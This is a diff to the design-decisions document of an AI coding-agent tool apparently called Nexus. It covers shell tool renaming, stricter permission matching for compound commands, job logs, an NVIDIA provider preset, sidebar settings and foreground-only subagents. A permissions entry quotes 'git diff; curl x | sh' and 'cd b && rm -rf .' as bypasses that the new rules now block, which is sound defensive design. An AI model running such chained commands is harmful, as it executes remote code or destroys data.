@@ -81,7 +81,10 @@ paths themselves. See [desktop.md](desktop.md).
 | **Worktree integration applies frozen bytes to a clean parent with a rollback journal; no Git commit/reset/stash/checkout; the user acknowledges an exact review.** | Reviewable, recoverable, no surprise history changes. | `agents/worktree_*.py` |
 | **MCP is wrapped once (`mcp/client.py`); its output is untrusted;** a tool is mutating unless `readOnlyHint` is explicitly true; a dead server never fails a turn. | Upstream churn stays in one file; fail-safe defaults. | `mcp/` |
 | **Web tools are public-address-only with address pinning;** search results' links are never fetched. | SSRF and rebinding defence; injection surface reduction. | `net/` |
-| **`bash` yields long commands to background jobs** instead of killing them; `wait` returns on exit. | Long builds finish; the model stops polling. | [tools.md](tools.md#shell-jobs) |
+| **`shell` (formerly `bash`) yields long commands to background jobs** instead of killing them; `wait` returns on exit. | Long builds finish; the model stops polling. | [tools.md](tools.md#shell-jobs) |
+| **The model-facing tool is `shell`; `bash`/`Bash` are exact, one-way aliases** for calls, tool lists, rules, stored grants, hook matchers and code mode, and wildcard rules keep matching through the old spellings. Old history is renamed only in the assembled request. | A stored `deny = ["b*"]` or `Bash(...)` rule must never silently stop applying. | [tools.md](tools.md), `tools/names.py` |
+| **A glob allow rule never auto-allows a compound shell command; glob deny/ask rules see every segment.** Exact rules and grants are unchanged. | `shell(git diff*)` used to allow `git diff; curl x \| sh` and `shell(rm -rf*)` missed `cd b && rm -rf .`. Tightens, never widens. | [tools.md](tools.md#permissions-permissionspy), `tools/shell_syntax.py` |
+| **Every shell job keeps one combined, arrival-ordered log file** (bounded and counted, never silent); the session cwd is a recorded value, not a long-lived shell process. | Large output is truncated in the conversation but never lost; no hidden shell state. | [tools.md](tools.md#shell-jobs), [plans/SHELL_PLAN.md](../plans/SHELL_PLAN.md) |
 
 ## Providers and models
 
@@ -197,8 +200,9 @@ Stated so nobody builds on a false assumption.
   `.nexus/hooks.toml`; the canonical path is `.agents/hooks.toml`.
 - **Voice** real-model inference, platform support and network behavior are
   unverified. **Copilot** device sign-in is not live-tested.
-- **Not done:** completion notifications for background shell jobs still running
-  at turn end; `nexus ext restore`.
+- **Not done:** `nexus ext restore`. Background shell job completion
+  notifications (plan P5) are implemented and focused-tested, but the shell plan
+  as a whole is not complete (P6/P7 and the P4 Ratatui panel remain).
 
 ## Standard installation includes Claude Agent; the installer adds voice
 
@@ -677,6 +681,17 @@ harmlessly. `live.levels` is in the catalogue but never emitted by the daemon:
 clients draw their meter from the helper's own output. Revisit if a bus-only
 path appears.
 
+## NVIDIA is a preset over the Chat Completions adapter (2026-10)
+
+NVIDIA's hosted catalogue is a standard OpenAI-compatible Chat Completions
+endpoint (Pi's `nvidia.ts`; models.dev lists `@ai-sdk/openai-compatible`), and
+`reasoning_content` already decodes. A config block could reach it, but could
+not default the endpoint and `NVIDIA_API_KEY`, send the billing-origin header
+OpenCode's plugin sends (with a Nexus value, not OpenCode's referrer), or make
+the catalogue resolve `nvidia/...` without a `base_url`. `providers/nvidia.py`
+is therefore a thin subclass; the registry lets the direct id win over the
+generic `npm` signal. Unverified against the live API.
+
 ## xAI is a preset over the Responses adapter, not a new parser (2026-10)
 
 Grok speaks the OpenAI Responses wire with the standard reasoning-summary
@@ -794,11 +809,18 @@ four tabs, so `/sessions` no longer replaces the conversation with a page. Decis
 - **New host commands instead of UI I/O.** Files and Git need data the UI must not read itself, so
   `DirectoryList` and `GitStatus` return bounded, redacted, path-checked results (`docs/host.md`).
   Refused: reusing `FileSearch` (a flat ranked search, not navigation) and `GitDiff` (a patch, not status).
-- **Python owns state, Rust draws.** Open/closed, tab and width persist as `sessions_sidebar`,
-  `sidebar_tab`, `sidebar_width` (default closed; the old preference key is kept). The drag is
+- **Python owns state, Rust draws.** Open/closed, tab and width persist as `sidebar_open`,
+  `sidebar_tab`, `sidebar_width` (default closed). The old `sessions_sidebar` preference is left
+  alone: the GPUI desktop reads it (default open) from the same `tui.json`, so reusing it would have
+  changed the desktop's default or opened the terminal sidebar for everyone. The drag is
   optimistic in Rust and saved once on release. The client yields to the conversation: the sidebar
   hides rather than leaving it under 56 columns, and its width is 24..60 (mirrored constants, pinned
   by `tests/test_ratatui_sidebar.py`).
+- **The right sidebar follows the same pattern.** Width persists as `details_width` (default 40,
+  24..60), projected as `details_panel.width`; the divider drag is optimistic and saved on release.
+  The Changes tab keeps the stored id `Files` (renaming it would invalidate saved preferences and the
+  desktop's shared `details_tab`). Each tab builds its own rows in `details_sidebar.rs`: slicing a
+  combined list by section title silently broke when a title changed (`MODIFIED FILES` → `CHANGES`).
 - **Legacy page kept.** Hosts and fixtures that send no `sidebar.available` (the desktop bridge, old
   snapshots, existing tests) keep the full-page Sessions dashboard.
 - Not verified: this change was written without a compiler or a terminal; see "Left sidebar" in
@@ -1308,3 +1330,30 @@ its `max_live` slot until `subagent_stop`/`AgentClose`. Reasons for the shape:
   spawn, and never touches a running child.
 - **`nexus run` waits for children** up to `oneshot_wait_seconds` (phase 3), so the new
   default does not make one-shot runs exit before the report.
+
+## Subagents are foreground-only; supersedes the background flow
+
+The four decisions above (reports as root inputs, the per-session pool, persistent and
+continuable children, non-blocking by default) are **superseded**. The `subagent` tool is
+the only model-facing subagent tool and always blocks: its schema is `prompt`,
+`subagent_type`, `tools`, `model`, `description` and `worktree`, with no `background` or
+`wait`. `subagent_send`, `subagent_stop` and `subagent_list` are gone from the tool
+registry, the `task` bundle, the code-mode catalog, the permission rule family and the
+auto-add that attached them to `subagent`. Reasons:
+
+- **A detached child needed a second delivery path** (report queue, auto-wakes, replay on
+  open, one-shot waiting, eviction of idle slots) that models rarely used well: they
+  polled, re-spawned, or forgot to close children. A blocking call returns the report
+  where the model asked for it, with nothing to reconcile after a restart.
+- **Concurrency is kept without detaching.** Independent `subagent` calls issued together
+  in one batch run in parallel and the turn waits for all reports; the `build` and
+  `orchestrator` prompts say so. Ending the root turn cancels its children.
+- **Compatibility, not deletion of history.** Old logs replay: background spawns,
+  `agent.resumed`, `agent.stopped`, report inputs and wake-paused notices still fold and
+  render. A legacy child whose last run completed reads as finished, not idle; a running
+  one can still be cancelled; host `AgentClose` stays. `agents.background` (and the
+  report/wake keys that served it) parse and are ignored. Role files naming the old control
+  tools get an unknown-tool warning. `Task(<role>:<tier>)` spawn permission keys are
+  unchanged.
+- **Budget semantics are unchanged**: the session tree budget (concurrency, fan-out,
+  tokens, cost, per-root-turn window) is kept as is.
